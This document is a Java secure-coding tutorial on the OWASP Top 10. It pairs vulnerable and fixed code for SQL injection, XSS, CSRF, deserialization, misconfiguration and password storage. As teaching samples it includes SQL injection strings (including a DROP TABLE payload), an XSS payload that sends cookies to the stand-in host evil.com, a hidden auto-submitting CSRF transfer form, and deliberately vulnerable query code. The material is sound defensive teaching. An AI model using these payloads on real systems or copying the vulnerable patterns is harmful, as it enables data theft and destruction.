# Phase 16.1 — Application Security Fundamentals

## Why Security Is a First-Class Concern

Security is not a feature you bolt on after your application is built — it is a quality attribute that must be woven into every layer of your design, from how you validate input to how you store sensitive data. The cost of a security breach is asymmetric: prevention is cheap compared to the legal liability, reputational damage, regulatory fines, and customer trust that is lost after an incident.

The most important framework for Java developers to understand is the **OWASP Top 10** — the Open Web Application Security Project's authoritative list of the ten most critical web application security risks. These are not theoretical; they represent the actual vulnerabilities that attackers exploit in real systems every day. Each one has a clear cause, a clear prevention strategy, and Java-specific code patterns for getting it right.

---

## OWASP Top 10 — Overview

The OWASP Top 10 (2021 edition) lists the following risks in order of prevalence and severity:

**A01 — Broken Access Control** is the most common risk. Users can act outside their intended permissions — viewing other users' data, escalating privileges, or accessing admin functions. Prevention requires enforcing access control server-side on every request, not just in the UI.

**A02 — Cryptographic Failures** (formerly "Sensitive Data Exposure") refers to weaknesses in how data is protected in transit and at rest — using MD5 for password hashing, sending sensitive data over HTTP, or storing plaintext passwords.

**A03 — Injection** (SQL, LDAP, OS command, etc.) occurs when untrusted data is sent to an interpreter as part of a command or query. SQL Injection is the canonical example.

**A04 — Insecure Design** is about architectural and design flaws that no amount of correct implementation can fix — for example, a password reset flow that uses predictable tokens.

**A05 — Security Misconfiguration** covers default credentials, unnecessary features enabled, verbose error messages, missing security headers, and misconfigured cloud permissions.

**A06 — Vulnerable and Outdated Components** — using libraries or frameworks with known CVEs.

**A07 — Identification and Authentication Failures** — broken session management, weak passwords, missing MFA.

**A08 — Software and Data Integrity Failures** — including insecure deserialization and CI/CD pipeline vulnerabilities.

**A09 — Security Logging and Monitoring Failures** — insufficient logging that allows attackers to operate undetected.

**A10 — Server-Side Request Forgery (SSRF)** — the application fetches a remote resource based on user-supplied input, allowing an attacker to coerce the server into making requests to internal infrastructure.

The following sections cover the risks most directly relevant to Java developers in detail.

---

## SQL Injection — The Classic Killer

**SQL Injection** is a vulnerability where an attacker inserts malicious SQL code into an input field that is incorporated directly into a database query. When the query runs, the attacker's SQL executes with the full privileges of the database user, potentially reading all data, modifying records, or dropping entire tables.

### The Vulnerable Pattern — String Concatenation

Any time you build a SQL query by concatenating user input with string operations, you are vulnerable:

```java
// ❌ CRITICALLY DANGEROUS — Never do this
public User findUserByUsername(String username) {
    // If the attacker enters: ' OR '1'='1
    // The query becomes: SELECT * FROM users WHERE username = '' OR '1'='1'
    // This returns ALL users in the database

    // If the attacker enters: admin'; DROP TABLE users; --
    // The query becomes: SELECT * FROM users WHERE username = 'admin'; DROP TABLE users; --'
    // This deletes the entire users table

    String query = "SELECT * FROM users WHERE username = '" + username + "'";

    try (Statement stmt = connection.createStatement();
         ResultSet rs = stmt.executeQuery(query)) {
        // ...
    }
}
```

The attacker does not need to know your table structure. They can use techniques like UNION-based injection to extract data from other tables, or time-based blind injection to infer data character by character through response timing.

### The Fix — PreparedStatement with Parameterized Queries

The correct and complete solution is to use **parameterized queries** via `PreparedStatement`. The SQL is sent to the database engine as a template with placeholders (`?`). The user input is sent separately as a parameter. Because the database engine parses the SQL template *before* receiving the parameter, the input can never be interpreted as SQL — it is always treated as a data value.

```java
// ✅ SAFE — Using PreparedStatement with parameterized queries
public Optional<User> findUserByUsername(Connection connection, String username)
        throws SQLException {

    // The SQL template is fixed and pre-compiled.
    // The '?' placeholder is where user input will go — as DATA, never as SQL code.
    String sql = "SELECT id, username, email, role FROM users WHERE username = ?";

    try (PreparedStatement stmt = connection.prepareStatement(sql)) {

        // Set the parameter value. The JDBC driver handles all necessary escaping.
        // Even if the attacker enters "' OR '1'='1", it is treated as a literal string.
        stmt.setString(1, username);

        try (ResultSet rs = stmt.executeQuery()) {
            if (rs.next()) {
                return Optional.of(mapRowToUser(rs));
            }
            return Optional.empty();
        }
    }
}

// ✅ SAFE — Multi-parameter query
public List<Order> findOrdersByCustomerAndStatus(Connection connection,
        long customerId, String status) throws SQLException {

    String sql = "SELECT * FROM orders WHERE customer_id = ? AND status = ? ORDER BY created_at DESC";

    try (PreparedStatement stmt = connection.prepareStatement(sql)) {
        stmt.setLong(1, customerId);    // Parameter 1: customer_id (numeric, not injectable)
        stmt.setString(2, status);      // Parameter 2: status
        // ...
    }
}
```

If you use Spring Data JPA or Hibernate, parameterization is handled automatically by the framework — but you must still use JPQL/HQL parameters (the `:name` or `?1` syntax) and never interpolate user input into query strings:

```java
// ✅ SAFE in Spring Data JPA — using named parameter
@Query("SELECT u FROM User u WHERE u.username = :username AND u.active = true")
Optional<User> findActiveByUsername(@Param("username") String username);

// ❌ DANGEROUS even in JPA — string interpolation in native query
@Query(value = "SELECT * FROM users WHERE username = '" + "' + username + '", nativeQuery = true)
// This is still vulnerable! Never do this.
```

---

## Cross-Site Scripting (XSS)

**XSS** occurs when an attacker injects malicious JavaScript into a web page that is then served to other users. When the victim's browser renders the page, it executes the injected script, which can steal session cookies, capture keystrokes, redirect to phishing sites, or perform actions on behalf of the victim.

There are three types. **Reflected XSS** — the malicious script is embedded in a URL and reflected back in the immediate response. **Stored XSS** — the script is saved to the database and served to all users who view that content (a comment section is the classic example). **DOM-based XSS** — the attack occurs entirely in the client-side JavaScript, with no server involvement.

### The Vulnerable Pattern — Rendering Unsanitized Input

```java
// ❌ VULNERABLE — Embedding raw user input directly in HTML output
// If the user's name is: <script>document.cookie='stolen=' + document.cookie; fetch('https://evil.com/steal?' + document.cookie)</script>
// ... that script executes in every visitor's browser

@GetMapping("/profile/{userId}")
public String renderProfile(@PathVariable Long userId, Model model) {
    User user = userService.findById(userId);
    // DO NOT do: model.addAttribute("displayName", user.getRawName());
    // If user.getRawName() contains HTML/JS, Thymeleaf in th:utext would execute it
    model.addAttribute("displayName", user.getRawName());
    return "profile";
}
```

```html
<!-- ❌ VULNERABLE in Thymeleaf — th:utext renders raw HTML without escaping -->
<h1 th:utext="${displayName}">User Name</h1>
```

### The Fix — Output Encoding

The core defense against XSS is **output encoding**: convert characters that have special meaning in HTML (`<`, `>`, `&`, `"`, `'`) into their safe HTML entity equivalents (`&lt;`, `&gt;`, `&amp;`, `&quot;`, `&#x27;`). A browser will display these as literal characters rather than interpreting them as HTML or executing them as scripts.

Modern template engines like **Thymeleaf** auto-escape by default, which is why you should use `th:text` rather than `th:utext` (the "u" stands for "unescaped"):

```html
<!-- ✅ SAFE — th:text auto-escapes HTML special characters -->
<h1 th:text="${displayName}">User Name</h1>
<!-- If displayName is "<script>alert(1)</script>",
     the rendered HTML is: <h1>&lt;script&gt;alert(1)&lt;/script&gt;</h1>
     The browser displays the literal text, not a script tag. -->
```

For cases where you must handle untrusted HTML (e.g., a WYSIWYG rich text editor where users can apply bold, italic, links), use a sanitization library like **OWASP Java HTML Sanitizer**:

```java
// ✅ SAFE — Sanitizing HTML to allow only a safe subset of tags
import org.owasp.html.PolicyFactory;
import org.owasp.html.Sanitizers;

@Service
public class ContentSanitizer {

    // Build a policy that allows only safe formatting tags, no scripts or event handlers
    private static final PolicyFactory POLICY = Sanitizers.FORMATTING
        .and(Sanitizers.LINKS)
        .and(Sanitizers.BLOCKS);

    public String sanitize(String untrustedHtml) {
        // This strips <script>, onclick="", <iframe>, javascript: URLs, etc.
        // while preserving safe tags like <b>, <i>, <a href="...">, <p>
        return POLICY.sanitize(untrustedHtml);
    }
}
```

Additionally, always set the **Content-Security-Policy (CSP)** HTTP response header. CSP tells the browser which sources of scripts are trusted, providing a powerful second line of defense:

```java
// In a Spring Security configuration or a servlet Filter:
response.setHeader("Content-Security-Policy",
    "default-src 'self'; " +          // By default, only load resources from the same origin
    "script-src 'self'; " +           // Only execute scripts from the same origin
    "style-src 'self' 'unsafe-inline'; " +
    "img-src 'self' data:; " +
    "frame-ancestors 'none'");        // Prevent clickjacking by disallowing iframes
```

---

## CSRF — Cross-Site Request Forgery

**CSRF** is an attack where a malicious website tricks an authenticated user's browser into making an unwanted request to your application. Because the browser automatically sends cookies (including session cookies) with every request, the server has no way to distinguish a legitimate request from the user's own page from one forged by a malicious site — unless you add a CSRF token.

Imagine Alice is logged in to her bank's website. She visits an attacker's page which contains:

```html
<!-- On the attacker's page — the user never sees this form -->
<form id="evil-form" action="https://alice-bank.com/transfer" method="POST">
    <input type="hidden" name="amount" value="10000"/>
    <input type="hidden" name="toAccount" value="attacker-account"/>
</form>
<script>document.getElementById('evil-form').submit();</script>
```

When this page loads, the form is submitted silently. The bank's server receives the POST request with Alice's valid session cookie and processes the transfer. The bank cannot tell this came from the attacker's page rather than Alice's own browser.

### The Fix — Synchronizer Token Pattern

The standard defense is the **CSRF Token (Synchronizer Token Pattern)**. The server generates a random, unpredictable token and embeds it in every HTML form as a hidden field. When the form is submitted, the server validates that the submitted token matches the one it generated. The attacker's page cannot read the CSRF token from the legitimate page (due to the browser's Same-Origin Policy), so it cannot forge a request that includes the valid token.

**Spring Security** implements this automatically:

```java
// Spring Security 6 — CSRF protection is ENABLED by default for state-changing methods
@Configuration
@EnableWebSecurity
public class SecurityConfig {

    @Bean
    public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
        http
            // CSRF is ON by default — this is just explicit for illustration
            .csrf(csrf -> csrf
                // For traditional form-based apps, use the default CookieCsrfTokenRepository
                // or HttpSessionCsrfTokenRepository (the default)
                .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse())
                // CookieCsrfTokenRepository puts the token in a cookie named XSRF-TOKEN
                // JavaScript can read it and send it back as a header (X-XSRF-TOKEN)
                // This is the recommended approach for Single Page Applications (SPAs)
            );
        return http.build();
    }
}
```

In your Thymeleaf template, Spring Security automatically injects the CSRF token into forms rendered by Thymeleaf's form tag:

```html
<!-- Thymeleaf auto-inserts the _csrf hidden field when using th:action -->
<form th:action="@{/transfer}" method="post">
    <!-- Spring Security's Thymeleaf integration auto-adds: -->
    <!-- <input type="hidden" name="_csrf" value="a1b2c3d4-..."/> -->
    <input type="number" name="amount"/>
    <button type="submit">Transfer</button>
</form>
```

For **REST APIs consumed by SPAs** (React, Angular, Vue), CSRF works differently because forms are not submitted — JSON is sent via JavaScript's `fetch()` or `axios`. The recommended approach is to use the `CookieCsrfTokenRepository` pattern above: Spring sets an `XSRF-TOKEN` cookie; your JavaScript reads it and sends it back as an `X-XSRF-TOKEN` header. The Same-Origin Policy prevents the attacker's page from reading the cookie.

For **stateless REST APIs using JWT** (where no session cookie is used), CSRF is not a concern because there is nothing for the attacker's page to leverage — there is no cookie being automatically sent. In this case, you can disable CSRF:

```java
// For stateless JWT-based APIs, CSRF can be safely disabled
// because there is no session cookie to steal
.csrf(csrf -> csrf.disable())
```

---

## Insecure Deserialization

Java's native serialization mechanism (`ObjectInputStream` / `ObjectOutputStream`) is notoriously dangerous when used with untrusted data. The act of deserialization itself — before your code ever touches the deserialized object — can execute arbitrary code through **gadget chains** (sequences of existing classes in the classpath that, when deserialized in the right order, invoke dangerous methods like `Runtime.exec()`).

The Apache Commons Collections vulnerability (CVE-2015-4852) was a famous example: attackers could achieve remote code execution on any server that had Apache Commons Collections on its classpath and was deserializing untrusted data — no special setup required.

### Rules for Safe Deserialization

Never deserialize data from an untrusted source using Java's native `ObjectInputStream`. If you must use it, implement a **look-ahead deserialization filter** (available since Java 9 via `ObjectInputFilter`) that whitelists only the classes you expect:

```java
// ✅ Using ObjectInputFilter to whitelist allowed classes
public <T> T deserialize(byte[] data, Class<T> expectedType) throws IOException, ClassNotFoundException {

    try (ByteArrayInputStream bais = new ByteArrayInputStream(data);
         ObjectInputStream ois = new ObjectInputStream(bais)) {

        // Only allow deserialization of the specific expected class
        // Reject everything else — this prevents gadget chain exploits
        ois.setObjectInputFilter(filterInfo -> {
            Class<?> clazz = filterInfo.serialClass();
            if (clazz == null) return ObjectInputFilter.Status.UNDECIDED;

            if (clazz == expectedType || clazz == String.class || clazz == Long.class) {
                return ObjectInputFilter.Status.ALLOWED;
            }
            return ObjectInputFilter.Status.REJECTED;  // Reject all other classes
        });

        return expectedType.cast(ois.readObject());
    }
}
```

The better long-term solution is to **avoid Java native serialization entirely** for data exchange. Use JSON (Jackson), Protocol Buffers, or Avro — these formats are data-only and cannot execute code during parsing. Reserve Java serialization only for internal JVM communication where you fully control both ends, and even then, use it sparingly.

---

## Security Misconfiguration

Security misconfiguration is the broadest category and the easiest to accidentally introduce. Common examples in Java/Spring Boot applications include:

**Leaving Spring Boot Actuator endpoints exposed** without authentication. By default in earlier versions, `/actuator/env` exposes all environment variables (including secrets), `/actuator/heapdump` downloads the entire JVM heap (containing passwords in memory), and `/actuator/shutdown` can kill your application. Always restrict Actuator access:

```yaml
# application.yml
management:
  endpoints:
    web:
      exposure:
        # Only expose health and info publicly — nothing else
        include: health, info
  endpoint:
    health:
      show-details: when-authorized   # Don't show full health details to anonymous users
```

**Verbose error messages** that reveal stack traces, library versions, or internal paths to users. Spring Boot's default error handling can expose this information. Use a custom error controller:

```java
// Custom error response that reveals nothing about internals
@RestControllerAdvice
public class GlobalExceptionHandler {

    private static final Logger log = LoggerFactory.getLogger(GlobalExceptionHandler.class);

    @ExceptionHandler(Exception.class)
    @ResponseStatus(HttpStatus.INTERNAL_SERVER_ERROR)
    public ErrorResponse handleGenericException(Exception ex, HttpServletRequest request) {
        // Log the full detail internally (with correlation ID for traceability)
        String correlationId = UUID.randomUUID().toString();
        log.error("Unhandled exception correlationId={}", correlationId, ex);

        // Return only a generic, safe message to the client — no stack trace
        return new ErrorResponse(
            "An internal error occurred. Reference: " + correlationId,
            HttpStatus.INTERNAL_SERVER_ERROR.value()
        );
    }
}
```

**Missing HTTP security headers** — add these to every response via Spring Security:

```java
@Bean
public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
    http
        .headers(headers -> headers
            // Prevent browsers from MIME-sniffing a response away from the declared content-type
            .contentTypeOptions(withDefaults())
            // Prevent clickjacking by disallowing the page to be framed
            .frameOptions(frame -> frame.deny())
            // Enable browser's built-in XSS filter (legacy, but harmless)
            .xssProtection(withDefaults())
            // Force HTTPS for the specified duration (HSTS)
            .httpStrictTransportSecurity(hsts -> hsts
                .includeSubDomains(true)
                .maxAgeInSeconds(31536000)  // 1 year
            )
        );
    return http.build();
}
```

---

## Sensitive Data Exposure

Sensitive data includes passwords, credit card numbers, Social Security numbers, health records, session tokens, and API keys. The key principle is **data minimization** — only collect and retain what you genuinely need — and **protection at rest and in transit**.

**Never store plaintext passwords.** Use a strong, adaptive hashing algorithm designed for passwords. `BCrypt`, `SCrypt`, and `Argon2` are the correct choices. MD5 and SHA-1 are **not** acceptable for passwords — they are general-purpose hash functions that are fast by design, meaning an attacker with a GPU can test billions of guesses per second against a leaked hash. BCrypt is intentionally slow.

```java
// Spring Security's BCryptPasswordEncoder — the standard for Spring Boot apps
@Bean
public PasswordEncoder passwordEncoder() {
    // The "strength" parameter (work factor) controls how slow the algorithm is.
    // 12 is a good modern choice — it takes ~300ms on a modern CPU,
    // which is fine for user logins but makes brute force completely impractical.
    return new BCryptPasswordEncoder(12);
}

@Service
public class UserService {

    @Autowired
    private PasswordEncoder passwordEncoder;

    public void register(RegisterRequest request) {
        // Hash the password before storing — NEVER store the raw password
        String hashedPassword = passwordEncoder.encode(request.getPassword());
        // Store hashedPassword, not request.getPassword()
        userRepository.save(new User(request.getUsername(), hashedPassword));
    }

    public boolean verifyPassword(String rawPassword, String storedHash) {
        // BCrypt's matches() re-hashes the rawPassword and compares — constant time comparison
        return passwordEncoder.matches(rawPassword, storedHash);
    }
}
```

**Always use HTTPS** (TLS 1.2 or 1.3 minimum) for all traffic. In Spring Boot, configure your embedded server with a valid certificate. In production, terminate TLS at a load balancer or API gateway rather than at the application server — but ensure internal traffic between services is also encrypted, especially in untrusted network environments (use mTLS in a service mesh).

**Mask sensitive data in logs.** Never log raw passwords, credit card numbers, or personal identifiable information. If your code receives a `PaymentRequest`, make sure your `toString()` method masks the card number:

```java
public record PaymentRequest(String cardNumber, int cvv, BigDecimal amount) {

    @Override
    public String toString() {
        // Mask the card number and never include the CVV in any log output
        String maskedCard = "*".repeat(12) + cardNumber.substring(cardNumber.length() - 4);
        return "PaymentRequest{card=" + maskedCard + ", amount=" + amount + "}";
    }
}
```

---

## Key Best Practices Summary

The golden rule in application security is **defense in depth** — never rely on a single security control. Layer your defenses so that if one fails, others remain.

Always validate input at the server side, regardless of what client-side validation you have in place. Client-side validation is a UX feature, not a security feature — an attacker will simply send raw HTTP requests bypassing your JavaScript entirely.

Apply the **principle of least privilege** everywhere: database users should only have the permissions they need (a read-only service account should not have `DROP TABLE`), application service accounts should have the minimum IAM permissions required, and API endpoints should verify that the authenticated user is authorized to perform the specific operation on the specific resource.

Treat security as a continuous process, not a one-time review. Regularly scan your dependencies for known CVEs using tools like `mvn dependency-check:check` (OWASP Dependency Check) or integrate Snyk or GitHub Dependabot into your CI pipeline. A library that was secure when you added it may have a critical vulnerability six months later.
